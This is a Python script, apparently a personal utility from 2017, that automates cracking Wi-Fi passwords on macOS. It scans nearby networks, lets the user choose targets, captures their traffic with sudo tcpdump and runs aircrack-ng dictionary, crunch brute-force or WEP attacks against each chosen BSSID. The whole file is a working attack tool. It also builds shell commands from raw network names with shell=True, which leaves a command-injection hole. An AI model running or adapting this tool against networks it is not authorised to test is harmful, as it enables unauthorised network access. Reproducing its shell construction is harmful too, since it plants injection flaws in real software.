# net_crack.py
# Ryan Stonebraker
# 12/3/2017
# Automated Wireless Cracking Utility


import subprocess
import sys
import re
import time

# Simple function to make sure a string is a number
def isint(num):
	try:
		int(num)
	except:
		return False
	return True

parameters = {
	# Packet Capturing Parameters
	"time_limit" : "10",
	"packet_limit" : "NA",
	"limit_flags" : "-W 1 -G 10",

	# Global Parameters
	"attack_method" : "dictionary",
	"timeout" : "60",

	# Dictionary Attack Parameter
	"wordlist" : "rockyou.txt",

	# Brute Force Parameters
	"brute_force_string" : "pasword",
	"brute_force_lower" : "8",
	"brute_force_upper" : "8",
	"brute_force_script" : "crunch",

	# WEP Crack Parameters (NONE)
}

# ********** START FLAG CHECK
change_limit = False
for arg_num in range(0, len(sys.argv[1:]) + 1):
	if sys.argv[arg_num] == "-h":
		print("""USAGE: python net_crack.py [-t {LISTENING TIME LIMIT}] 	<-> Limit capturing by a time limit
			   [-c {MAX CAPTURED PACKETS}] 	<-> Limit capturing by the number of packets
			   [-w {WORDLIST LOCATION}] 	<-> Password Dictionary list (wordlist)
			   [-b {Lower_Lim Upper_Lim}] 	<-> Brute Forcing lower and upper password length range
			   [-s bruteforce_charset] 	<-> String containing all characters to use while bruteforcing
			   [-a {b|d|w}] 		<-> Attack method bruteforce, dictionary, or WEP only
			   [-m {time out}] 		<-> Time out for password cracking (seconds)""")
		quit()

	elif sys.argv[arg_num] == "-t" and arg_num + 1 < len(sys.argv) and (isint(sys.argv[arg_num + 1]) or sys.argv[arg_num+1] == "NA"):
		parameters["time_limit"] = str(sys.argv[arg_num + 1])
		change_limit = True

	elif sys.argv[arg_num] == "-c" and arg_num + 1 < len(sys.argv) and isint(sys.argv[arg_num + 1]):
		parameters["packet_limit"] = str(sys.argv[arg_num + 1])
		change_limit = True

	elif sys.argv[arg_num] == "-w" and arg_num + 1 < len(sys.argv):
		parameters["wordlist"] = str(sys.argv[arg_num + 1])

	elif sys.argv[arg_num] == "-b" and arg_num + 2 < len(sys.argv) and isint(sys.argv[arg_num + 1]) and isint(sys.argv[arg_num + 2]):
		parameters["attack_method"] = "brute_force"
		parameters["brute_force_lower"] = str(sys.argv[arg_num + 1])
		parameters["brute_force_upper"] = str(sys.argv[arg_num + 2])

	elif sys.argv[arg_num] == "-a" and arg_num + 1 < len(sys.argv):
		if sys.argv[arg_num + 1] == "b":
			parameters["attack_method"] = "brute_force"

		elif sys.argv[arg_num + 1] == "d":
			parameters["attack_method"] = "dictionary"

		elif sys.argv[arg_num + 1] == "w":
			parameters["attack_method"] = "wep"

	elif sys.argv[arg_num] == "-s" and arg_num + 1 < len(sys.argv):
		parameters["brute_force_string"] = str(sys.argv[arg_num + 1])

	elif sys.argv[arg_num] == "-m" and arg_num + 1 < len(sys.argv) and isint(sys.argv[arg_num + 1]):
		parameters["timeout"] = sys.argv[arg_num + 1]

parameters["limit_flags"] = ""

if parameters["time_limit"] != "NA":
	parameters["limit_flags"] = "-W 1 -G " + parameters["time_limit"] + " "
if parameters["packet_limit"] != "NA":
	parameters["limit_flags"] += "-c " + parameters["packet_limit"]
# ********** END FLAG CHECK

# -- For testing so don't have to wait for info to display --
# with open("near.txt", "r") as nlist:
# 	networks = nlist.read().split("\n")
# -- End Testing --

# Store nearby networks to a variable and split based on new line
networks = subprocess.check_output(["airport", "-s"]).decode("utf-8").split("\n")

# Only show WEP networks if WEP atttack mode set
if parameters["attack_method"] == "wep":
	networks = [network for network in networks if "WEP" in network]

if len(networks) == 0:
	print("No (matching) Networks Found! Quitting...")
	quit()

# Print out nearby networks (ignore empty lines and misc characters)
[print(line, networks[line]) for line in range(0,len(networks)) if len(networks[line]) > 10]

# Ask user to choose network(s) they want to try to crack. "-" or ":" means crack a network in this range.
network_num = input("Choose Network Number(s): ")

# Quit if empty
if network_num.replace(" ", "") == "":
	print ("Empty Number. Quitting...")
	quit()

network_num = network_num.replace(",", " ").replace("  ", " ").replace(":", "-").split(" ")

# Find all specified ranges in users input and expand to include all numbers
for num_entry in network_num:
	if isint(num_entry) and int(num_entry) > len(networks) -1:
		print ("Invalid Network Number. Quitting...")
		quit()

	if "-" in num_entry:
		for rng_num in range(int(num_entry[:num_entry.find("-")]), int(num_entry[num_entry.find("-")+1:])+1):
			network_num.append(str(rng_num))
		network_num.remove(num_entry)

# For every network specified, get the ESSID, BSSID and CHANNEL and do network sniffing/capturing and attempt to crack passwords using specified method
for num in network_num:
	num = int(num)
	# Get rid of excess spaces and empty entries
	stored_line = list(filter(None, networks[num].replace("  ", " ").split(" ")))

	# If 2nd entry NOT the BSSID, then the ESSID has spaces in it and needs to be shifted over until 2nd entry is BSSID
	while ":" not in stored_line[1]:
		stored_line[0] += " " + stored_line[1]
		del stored_line[1]

	# If ESSID is stored properly, but there are 8 entries instead of 6, put everything in last entry
	while len(stored_line) == 8:
		stored_line[6] += " " + stored_line[7]
		del stored_line[7]

	# 			 					ESSID	    	BSSID
	print("\n\n------* CRACKING: ", stored_line[0], stored_line[1], "*------")

	# Get rid of spaces for writing out names
	stored_line[0] = stored_line[0].replace(" ", "_")

	# Concatenate the command for network monitoring using all initially specified flags
	tcpdump_params = "sudo tcpdump -s 0 -I -i en0 -w auto_cap_" + str(stored_line[0]) + ".pcap " + str(parameters["limit_flags"])

	# Create a different string for the aircrack-ng command depending on the attack method (will automatically crack WEP)
	if parameters["attack_method"] == "wep" or "WEP" in stored_line[6]:
		aircrack_params = "aircrack-ng -b " + str(stored_line[1]) + " auto_cap_" + str(stored_line[0]) + ".pcap"
	elif parameters["attack_method"] == "dictionary":
		aircrack_params = "aircrack-ng -b " + str(stored_line[1]) + " auto_cap_" + str(stored_line[0]) + ".pcap -w " + str(parameters["wordlist"])
	elif parameters["attack_method"] == "brute_force":
		aircrack_params = parameters["brute_force_script"] + " " + str(parameters["brute_force_lower"]) + " " + str(parameters["brute_force_upper"]) 
		aircrack_params += " " + parameters["brute_force_string"] + " | aircrack-ng -b " + str(stored_line[1]) + " -w- " + " auto_cap_" + str(stored_line[0]) + ".pcap"

	# Disassociate from the network
	# switch channel to that associated with target network
	# Monitor network traffic for given parameters
	# Crack the pcap file
	subprocess.Popen("sudo airport -z",shell=True).wait()
	subprocess.Popen("sudo airport --channel=" + str(stored_line[3]), shell=True).wait()
	subprocess.Popen(tcpdump_params, shell=True).wait()
	subprocess.Popen(aircrack_params, shell=True).wait()
	# TODO: Timeout currently doesn't work
	print("------* END CRACKING: ", stored_line[0], stored_line[1], "*------")
	print("\n")